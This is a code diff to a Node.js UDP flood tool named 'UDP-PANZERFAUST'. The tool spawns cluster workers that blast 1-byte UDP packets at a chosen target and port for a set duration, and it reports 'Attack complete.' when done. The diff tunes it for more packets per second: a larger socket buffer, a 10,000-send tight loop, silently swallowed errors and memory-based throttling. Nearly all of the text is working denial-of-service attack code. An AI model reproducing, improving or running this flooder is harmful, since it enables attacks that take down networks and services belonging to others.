@@ -12,10 +12,10 @@ if (!target || isNaN(duration)) {
 }
 
 const endTime = Date.now() + duration * 1000;
-const payload = Buffer.alloc(1); // 1-byte payload for max PPS
+const payload = Buffer.alloc(1);
 const cpuCount = os.cpus().length;
 
-const SAFE_MEM_THRESHOLD = 85; // RAM usage % before throttling
+const SAFE_MEM_THRESHOLD = 85;
 
 function getCpuUsage() {
   const cpus = os.cpus();
@@ -32,7 +32,7 @@ if (cluster.isMaster) {
   let maxPPS = 0;
 
   console.clear();
-  console.log('UDP-PANZERFAUST [MAX PPS VERSION]');
+  console.log('UDP-PANZERFAUST [MAX PPS + STABILITY]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
@@ -60,7 +60,7 @@ if (cluster.isMaster) {
     cpuStart = cpuEnd;
 
     console.clear();
-    console.log('UDP-PANZERFAUST [MAX PPS VERSION]');
+    console.log('UDP-PANZERFAUST [MAX PPS + STABILITY]');
     console.log('--------------------------------------');
     console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
     console.log(`Max PPS: ${maxPPS.toLocaleString()}`);
@@ -69,7 +69,7 @@ if (cluster.isMaster) {
     console.log('--------------------------------------');
 
     maxPPS = 0;
-  }, 2000);
+  }, 5000); // Refresh every 5s
 
   setTimeout(() => {
     console.log('\nAttack complete.');
@@ -79,8 +79,9 @@ if (cluster.isMaster) {
 
 } else {
   const sock = dgram.createSocket('udp4');
+  sock.unref(); // Let process exit naturally
   sock.bind(() => {
-    sock.setSendBufferSize(2 * 1024 * 1024); // Increase socket buffer
+    sock.setSendBufferSize(4 * 1024 * 1024); // Increase socket buffer
   });
 
   let sent = 0;
@@ -95,25 +96,23 @@ if (cluster.isMaster) {
   }
 
   function spam() {
-    function sendLoop() {
-      if (Date.now() > endTime) return;
+    while (Date.now() < endTime) {
+      if (isThrottled) {
+        Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 10000); // 10s pause
+        isThrottled = false;
+        continue;
+      }
 
-      if (!isThrottled) {
-        for (let i = 0; i < 5000; i++) {
-          sock.send(payload, port, target); // No callback = faster
+      for (let i = 0; i < 10000; i++) {
+        try {
+          sock.send(payload, port, target);
           sent++;
           pps++;
+        } catch (err) {
+          // Swallow any async UDP errors silently
         }
-        setTimeout(sendLoop, 0); // Yield without slowing
-      } else {
-        setTimeout(() => {
-          isThrottled = false;
-          sendLoop();
-        }, 10000);
       }
     }
-
-    sendLoop();
   }
 
   setInterval(() => {
